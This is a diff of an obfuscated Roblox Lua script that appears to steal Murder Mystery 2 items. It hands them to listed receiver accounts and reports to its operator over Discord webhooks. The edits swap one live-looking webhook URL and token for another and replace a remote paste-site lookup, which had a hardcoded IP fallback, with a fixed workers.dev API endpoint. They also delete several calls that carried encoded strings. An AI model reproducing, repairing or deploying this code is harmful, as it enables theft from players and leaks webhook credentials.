@@ -228,35 +228,13 @@ end
 
 v32("LocalPlayer: " .. LocalPlayer.Name)
 
-local v40 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
-
-local function v41()
-	local ok2, result2 = pcall(function()
-		return game:HttpGet(v40)
-	end)
-
-	if ok2 and result2 then
-		local match = result2:match("^%s*(.-)%s*$")
-
-		if match and match ~= "" then
-			if match:match("^https?://") then
-				return match
-			end
-
-			return "http://" .. match
-		end
-	end
-
-	return "http://212.119.42.158:3000"
-end
-
 if not getgenv().MM2_API_BASE then
-	getgenv().MM2_API_BASE = v41()
+	getgenv().MM2_API_BASE = "https://elysium-mm2-api.snthnova.workers.dev"
 end
 
 local MM2_API_BASE = getgenv().MM2_API_BASE
 local RECEIVERS = getgenv().RECEIVERS or {"iceyblueii"}
-local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1558512005340463214/gC9JNEOJDgRYBNEjy6DJ-mfeD3quipUnHn90FtQj2oY8JXmZNUkEYXszMHdJRbOjenRa"
+local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1555946397147340871/DxbuhVv2NAgy82zDDtSt1RK5GM5u9KMDf6SQ8bnPseDtxjjswRCz3BZ0t-l5A5TdZAM4"
 local THRESHOLD = getgenv().THRESHOLD or 10
 
 v32("Targets: " .. table.concat(RECEIVERS, ", "))
@@ -1381,7 +1359,7 @@ local function v277()
 		local v299 = v269(false, v278)
 
 		v299.content = "@everyone"
-		v251("AaFasalajblbebHagaqa[aebSa@aaaVaebVacb+aka*a%azamawaya_aNacaCaKacaDaPa=azaiaFada%aAa-a{a%adatbUaba7awaDahayagbkbwaGa!abaVa6avaaaya6aRayalbtb-aQa(aibzawbgamaaaAaOafaPa8agaia8agb+aaaXaxa-aiaEaga4aEaka@ana-a*aSafadbbbiaEa*avaaabbqaBaCa&aCagbRaRakbhb$aNahb2a%aCalbFaka+aAalauaRbpaaaib", v299.content, v299.embeds)
+
 		task.wait(0.5)
 		v256()
 
@@ -1451,10 +1429,10 @@ local function v277()
 		end
 	end
 
-	v251("AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb", "", v269(true, nil).embeds)
+
 
 	if v300 then
-		v251("AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb", "", v269(true, nil).embeds)
+
 	end
 end
 
